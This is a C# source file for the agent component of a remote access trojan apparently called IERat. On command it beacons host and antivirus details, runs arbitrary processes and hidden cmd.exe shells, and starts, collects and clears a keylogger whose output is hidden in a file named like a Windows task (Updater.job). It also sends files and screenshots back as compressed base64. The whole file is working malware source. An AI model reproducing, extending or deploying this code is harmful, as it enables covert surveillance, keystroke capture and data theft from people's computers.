using IERat.lib;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Web.Script.Serialization;

namespace IERat
{
    public class Agent
    {
        public Agent()
        {
            ID = Guid.NewGuid();
            Username = Environment.UserName;
            Domain = Environment.UserDomainName;
            Hostname = Environment.MachineName;
            OSVersion = Utils.GetOS();
            AV = AVUtils.GetAV();
            AgentTasks = new Queue<TaskObject>();
            CompletedAgentTasks = new Queue<TaskObject>();
            Version = Assembly.GetExecutingAssembly().GetName().Version.ToString();
            Cwd = Directory.GetCurrentDirectory();
            LoadedModules = new Dictionary<String, Thread>();
        }
        public Guid ID { get; set; }
        public string Username { get; set; }
        public string Domain { get; set; }
        public string Hostname { get; set; }
        public string OSVersion { get; set; }
        public string AV { get; set; }

        public string Cwd { get; set; }
        public string Version { get; set; }
        public Queue<TaskObject> AgentTasks { get; set; }
        public Queue<TaskObject> CompletedAgentTasks { get; set; }
        public Dictionary<String, Thread> LoadedModules { get; set; }

        public string GenerateBeacon()
        {
            return new JavaScriptSerializer().Serialize(this);
        }
        public void ExecuteTasks()
        {
            while (true)
            {
                while (this.AgentTasks.Count != 0)
                {
                    TaskObject NewAgentTask = IERat.channel.agent.AgentTasks.Dequeue();
                    string CmdType = NewAgentTask.Type;
                    Task.Run(() =>
                    {
                        if (CmdType == "Authenticated")  { IERat.channel.Status = "Connected"; }
                        else if (CmdType == "Reset")  { IERat.channel.Status = "Connecting"; }
                        else
                        {
                            try
                            {
                                NewAgentTask.Status = "Completed";
                                if (CmdType == "execute")
                                {
                                    string procPath = NewAgentTask.args;
                                    string procArgs = "";
                                    if (NewAgentTask.args.Contains(" "))
                                    {
                                        procPath = NewAgentTask.args.Split(' ')[0];
                                        procArgs = NewAgentTask.args.Split(' ')[1];
                                    }
                                    Process process = new Process {
                                        StartInfo = new ProcessStartInfo(procPath)
                                    };
                                    process.StartInfo.Arguments = procArgs;
                                    process.Start();
                                    NewAgentTask.Result = "Process started with PID " + process.Id.ToString();
                                }
                                else if (CmdType == "pwd")
                                {
                                    string pwd = Directory.GetCurrentDirectory();
                                    NewAgentTask.Result = pwd;
                                }
                                else if (CmdType == "klog_start")
                                {
                                    if (this.LoadedModules.ContainsKey("klog"))
                                    {
                                        if (this.LoadedModules["klog"].ThreadState.ToString() == "Running") {
                                            NewAgentTask.Result = "The Klog is already running";
                                        }
                                        else
                                        {
                                            this.LoadedModules["klog"].Resume();
                                            NewAgentTask.Result = "Klog Resumed";
                                        }
                                    }
                                    else
                                    {
                                        var klogThread = Modules.LoadModule(NewAgentTask.args);
                                        this.LoadedModules.Add("klog", klogThread);
                                        this.LoadedModules["klog"].Start();
                                        NewAgentTask.Result = "Klog Loaded & Started";
                                    }
                                }
                                else if (CmdType == "klog_stop")
                                {
                                    if (this.LoadedModules.ContainsKey("klog"))
                                    {
                                        if (this.LoadedModules["klog"].IsAlive == true) {
                                            this.LoadedModules["klog"].Suspend();
                                            NewAgentTask.Result = "The Klog module was stopped";
                                        }
                                        else {
                                            NewAgentTask.Result = "The Klog module is not running";
                                        }
                                    }
                                    else
                                    {
                                        NewAgentTask.Result = "The Klog module is not loaded";
                                    }
                                }
                                else if (CmdType == "klog_collect")
                                {
                                    if (this.LoadedModules.ContainsKey("klog"))  {
                                        if (File.Exists(@"C:\Windows\Tasks\Updater.job"))  {
                                            NewAgentTask.Result = File.ReadAllText(@"C:\Windows\Tasks\Updater.job");
                                        }
                                        else { NewAgentTask.Result = "Results file was not found"; }
                                    }
                                    else
                                    {
                                        NewAgentTask.Result = "The Klog module was not loaded";
                                    }
                                }
                                else if (CmdType == "klog_clear")
                                {
                                    if (File.Exists(@"C:\Windows\Tasks\Updater.job"))
                                    {
                                        File.Delete(@"C:\Windows\Tasks\Updater.job");
                                        NewAgentTask.Result = "Results file was deleted successfully";
                                    }
                                    else { NewAgentTask.Result = "Results file was not found"; }
                                }
                                else if (CmdType == "download")
                                {
                                    var File2Send = NewAgentTask.args;
                                    var FileBytes = File.ReadAllBytes(File2Send);
                                    NewAgentTask.Result = Convert.ToBase64String(Utils.Compress(FileBytes));
                                }
                                else if (CmdType == "screenshot")
                                {
                                    var FileBytes = Utils.CollectScreenshot();
                                    NewAgentTask.Result = Convert.ToBase64String(Utils.Compress(FileBytes));
                                }
                                else if (CmdType == "ls")
                                {
                                    // need to add directories too
                                    //string[] ls = Directory.GetFiles(Directory.GetCurrentDirectory());
                                    string[] entries = Directory.GetFileSystemEntries(Directory.GetCurrentDirectory(), "*");
                                    StringBuilder stringBuilder = new StringBuilder();
                                    foreach (string line in entries) {
                                        stringBuilder.AppendFormat("\n{0}", line);
                                    }
                                    NewAgentTask.Result = stringBuilder.ToString();
                                }
                                else if (CmdType == "cd")
                                {
                                    Directory.SetCurrentDirectory(NewAgentTask.args);
                                    string pwd = Directory.GetCurrentDirectory();
                                    NewAgentTask.Result = "Switched directory to " + pwd;
                                }
                                else if (CmdType == "kill")
                                {
                                    IERat.channel.Close();
                                    Environment.Exit(1);
                                }
                                else if (CmdType == "shell")
                                {
                                    Process cmdProcess = new Process
                                    {
                                        StartInfo = new ProcessStartInfo("cmd.exe")
                                    };
                                    cmdProcess.StartInfo.UseShellExecute = false;
                                    cmdProcess.StartInfo.CreateNoWindow = true;
                                    cmdProcess.StartInfo.RedirectStandardOutput = true;
                                    cmdProcess.StartInfo.Arguments = "/c " + NewAgentTask.args;
                                    cmdProcess.OutputDataReceived += (sender, args) => NewAgentTask.Result += args.Data;
                                    cmdProcess.Start();
                                    cmdProcess.BeginOutputReadLine();
                                }
                                else { NewAgentTask.Result = "error - unknown command"; }

                            }
                            catch (Exception ex)
                            {
                                NewAgentTask.Status = "Failed";
                                NewAgentTask.Result = ex.GetBaseException().Message; 
                            }
                            this.CompletedAgentTasks.Enqueue(NewAgentTask);
                        }
                    });                   
                }
            }
        }
    }
}




